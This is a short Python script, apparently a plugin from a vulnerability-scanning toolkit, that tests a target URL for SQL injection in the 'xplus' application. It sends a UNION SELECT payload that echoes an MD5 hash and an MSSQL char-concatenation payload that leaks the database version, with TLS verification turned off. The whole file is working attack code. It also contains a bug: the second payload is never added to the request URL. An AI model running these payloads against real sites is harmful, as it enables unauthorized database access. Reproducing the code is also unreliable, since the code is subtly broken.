#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: xplus通用注入
referer: http://www.hackdig.com/?07/hack-5007.htm
author: Lucifer
description: 对mysql和mssql注入点不同。
'''
import sys
import requests
import warnings
def run(url):
        result = ['xplus通用注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/www/index.php?mod=admin&con=deliver&act=view&username=809763517&deliId=-32%20UnIoN%20SeLeCt%201,Md5(1234),3,4,5,6,7,8,9,10,11,12,13--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
                return result
            else:
                result[2]=  '不存在'

            payload = "/www/index.php?mod=index&con=Review&act=getallpaper&papertype=scrb%27AnD%20ChAr(71)%252BChAr(65)%252BChAr(79)%252BChAr(74)%252BChAr(73)%252B@@VeRsIon%3E0--"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"GAOJIMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
